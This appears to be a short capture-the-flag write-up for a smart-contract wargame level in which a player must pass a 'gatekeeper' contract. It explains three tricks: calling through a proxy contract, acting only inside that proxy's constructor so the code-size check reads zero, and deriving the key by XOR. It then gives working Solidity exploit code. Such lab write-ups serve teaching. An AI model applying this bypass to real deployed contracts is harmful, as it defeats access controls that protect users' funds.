# Requirements

- Make it past the gatekeeper and register as an entrant to pass this level.

# Attack explanation

Gates:

1. Use a proxy sc.
2. Only work inside proxy sc constructor, so extcodesize is 0.
3. Use XOR property: a XOR key = 0xFF --> a XOR 0xFF = key.

# Attack function

We could solve the challenge by just using the next proxy sc:

```
contract GatekeeperProxy {
    constructor(address _addr) {
        bytes8 bytesKeccak = bytes8(keccak256(abi.encodePacked(address(this))));
        uint64 uintBytesKeccak = uint64(bytesKeccak);
        uint64 theKey = uintBytesKeccak ^ type(uint64).max;
        _addr.call(abi.encodeWithSignature("enter(bytes8)", bytes8(theKey)));
    }
}
```
